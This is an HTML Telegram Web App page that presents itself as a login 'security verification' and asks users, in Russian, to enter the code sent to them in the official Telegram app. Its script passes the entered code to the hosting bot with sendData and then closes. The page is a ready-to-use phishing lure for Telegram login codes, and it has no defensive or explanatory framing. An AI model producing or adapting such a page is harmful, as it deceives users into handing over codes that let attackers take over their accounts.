<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-theme-bg-color);
            color: var(--tg-theme-text-color);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        h2 { margin-bottom: 10px; }
        p { margin-bottom: 20px; font-size: 14px; opacity: 0.8; }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--tg-theme-hint-color);
            border-radius: 8px;
            background-color: var(--tg-theme-secondary-bg-color);
            color: var(--tg-theme-text-color);
            font-size: 18px;
            text-align: center;
            margin-bottom: 20px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background-color: var(--tg-theme-button-color);
            color: var(--tg-theme-button-text-color);
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Подтверждение входа</h2>
        <p>Для завершения проверки безопасности, пожалуйста, введите код, пришедший вам в официальном приложении Telegram.</p>
        <input type="text" id="code" placeholder="Введите код..." autocomplete="off">
        <button id="send">Подтвердить</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        document.getElementById('send').addEventListener('click', () => {
            const code = document.getElementById('code').value.trim();
            if (code) {
                // Отправляем данные боту через WebApp.sendData
                tg.sendData(JSON.stringify({ code: code }));
                tg.close();
            } else {
                alert('Пожалуйста, введите код.');
            }
        });
    </script>
</body>
</html>
